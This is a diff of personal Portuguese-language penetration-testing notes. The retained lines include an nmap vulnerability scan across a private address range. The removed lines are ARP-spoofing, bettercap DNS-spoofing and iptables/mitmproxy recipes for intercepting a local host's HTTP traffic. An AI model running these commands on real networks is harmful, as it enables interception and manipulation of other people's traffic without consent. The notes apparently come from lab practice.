@@ -61,7 +61,6 @@ Enumerando Mysql [MYSQL]
 
 
 
-HACKFLAG
 
 Info [NIKTO]
 
@@ -71,43 +70,12 @@ Busca com script [NMAP]
 
 nmap -v -T5 -sV 192.168.1.1-192.168.18.20 --vuln --script
 
-Usando ARPspoof [arpspoof]
 
-1° Passo: Habilitar encaminhamento de pacote
-	echo "1" > /proc/sys/net/ipv4/ip_forward
-2° Passo: Usar o comando arpspoof
-	arpspoof -i eth0 -t 192.168.18.47 192.168.18.1
-3° Passo: Utilizar os mesmo procedimentos com valores invertos 
-	arpspoof -i eth0 -t 192.168.18.1 192.168.18.47
 	
 
-Usando DNSspoof [dnsspoof]
-
-1° Primeiro e unico passo
-	bettercap -I eth0 -G 192.168.18.1 -T 192.168.18.157 --dns hosts.conf
-	
-Interceptando pesquisas HTTP [ARPSpoof + MITMProxy]
-Primeiros comandos:
-	iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
-	iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
 
 
 
-
-1° Passo
-	echo "1" > /proc/sys/net/ipv4/ip_forward
-2° Passo
-	arpspoof -i eth0 -t 192.168.18.1 192.168.18.47
-3° Passo 
-	arpspoof -i eth0 -t 192.168.18.47 192.168.18.1
-
-
-Parte 2: MITMProxy
-
-1° Passo:
-	mitmproxy --mode transparent --showhost
-
-- Testar novamente quando tiver um adaptador Wireless
 
 
 
